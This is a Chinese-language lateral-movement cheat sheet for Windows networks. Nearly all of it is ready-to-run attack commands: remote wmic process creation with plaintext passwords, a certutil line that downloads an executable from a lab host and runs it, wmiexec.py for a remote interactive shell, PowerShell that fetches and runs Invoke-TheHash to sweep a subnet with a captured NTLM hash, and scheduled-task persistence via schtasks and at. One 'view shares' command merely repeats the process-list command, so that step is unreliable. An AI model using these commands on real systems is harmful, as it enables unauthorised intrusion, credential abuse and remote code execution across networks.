# 横向移动技术



#### SMB <a id="smb"></a>

#### WMI <a id="wmi"></a>

使用wmic查询远程主机进程信息：

```text
wmic /node:192.168.111.251 /user:administrator /password:360College  process list brief
```

![](https://p408.ssl.qhimgs4.com/t012c7e4c27c967d88d.png)

创建进程：

```text
wmic /node:192.168.111.251 /user:administrator /password:360College  process call create "calc.exe"
```

![](https://p408.ssl.qhimgs4.com/t01b9633bf2b32bfa67.png)

```text
wmic /node:192.168.111.251 /user:administrator /password:360College  process call create "cmd /c  certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe c:/windows/temp/putty3.exe & c:/windows/temp/putty3.exe"
```

![](https://p408.ssl.qhimgs4.com/t01e689aa008a1e8c52.png)

使用powershell查看主机进程信息：

```text
Get-WmiObject -Namespace "root\cimv2" -class Win32_process -Credential administrator -ComputerName 192.168.111.251
```

![](https://p408.ssl.qhimgs4.com/t0141b1c91a0ded1a4d.png)

查看共享信息：

```text
Get-WmiObject -Namespace "root\cimv2" -class Win32_process -Credential administrator -ComputerName 192.168.111.251
```

![](https://p408.ssl.qhimgs4.com/t01c8c70c6639c8f435.png)

打开交互式shell:

```text
python setup.py install
python wmiexec.py -share admin$ administrator:360College@192.168.111.51
```

![](https://p408.ssl.qhimgs4.com/t012f662b0b548f12b6.png)

使用HASH碰撞内网中其他机器：

```text
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1');
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1');
Invoke-TheHash -Type WMIExec -Target 192.168.111.0/24 -Domain rootkit -Username administrator -Hash 7c70a81c7c5882c24298d391fd397885
```

![](https://p408.ssl.qhimgs4.com/t01506f4bee8e9b393b.png)

#### 计划任务 <a id="-"></a>

**ipc**

```text
net use \\192.168.111.201\IPC$ /user:"administrator" "360College"
copy C:\Users\guanxingzhou\Desktop\putty.exe \\192.168.111.201\c$
```

**schtasks**

```text
schtasks /create /s 192.168.0.70 /u Administrator /p 360College /ru "SYSTEM" /tn CMDNAME /sc DAILY /st 22:18 /tr C:\\Users\\college\\Desktop\\sha\\cmd.bat /F
```

**at**

```text
at \\192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:\windows\temp\cmd.bat
```

